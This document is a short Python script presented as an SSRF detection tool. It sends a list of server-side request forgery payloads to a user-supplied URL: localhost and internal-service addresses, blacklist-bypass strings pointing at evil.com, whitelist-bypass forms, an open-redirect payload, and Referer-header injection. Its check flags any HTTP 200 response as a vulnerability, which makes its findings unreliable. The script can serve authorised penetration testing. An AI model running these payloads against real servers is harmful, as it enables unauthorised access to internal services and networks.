import requests
import argparse

# List of payloads categorized by type
payloads = {
    "ssrf_server": ["http://127.0.0.1", "http://localhost"],
    "ssrf_backend": ["http://internal-service", "http://database-service"],
    "blacklist_bypass": ["http://127.0.0.1@evil.com", "http://localhost@evil.com"],
    "whitelist_bypass": ["http://whitelisted.com@127.0.0.1", "http://whitelisted.com@localhost"],
    "open_redirect": ["http://vulnerable-site.com/redirect?url=http://evil.com"],
    "partial_urls": ["//localhost", "//127.0.0.1"],
    "urls_in_data": ['{"url": "http://127.0.0.1"}', '<url>http://127.0.0.1</url>'],
    "referer_header": ["http://127.0.0.1", "http://localhost"]
}

# Function to test a URL for SSRF vulnerability
def test_ssrf(url):
    try:
        for category, urls in payloads.items():
            print(f"Testing category: {category}")
            for payload in urls:
                # Replace TARGET in URL with payload
                test_url = url.replace("TARGET", payload)
                # Set headers if testing referer header payloads
                headers = {"Referer": payload} if category == "referer_header" else {}
                response = requests.get(test_url, headers=headers, timeout=10)
                
                # Check if the response indicates a potential SSRF vulnerability
                if "metadata" in response.text or response.status_code == 200:
                    print(f"Potential SSRF vulnerability detected with payload: {payload}")
                else:
                    print(f"No SSRF detected with payload: {payload}")
                    
    except requests.exceptions.RequestException as e:
        print(f"Error testing URL {url}: {e}")

# Main function to parse arguments and run the tool
def main():
    parser = argparse.ArgumentParser(description="SSRF Detection Tool")
    parser.add_argument("url", nargs='?', help="URL to test for SSRF vulnerability (use 'TARGET' to denote the injection point)")
    args = parser.parse_args()
    
    if not args.url:
        args.url = input("Enter the URL to test for SSRF vulnerability (use 'TARGET' to denote the injection point): ")
    
    test_ssrf(args.url)

if __name__ == "__main__":
    main()
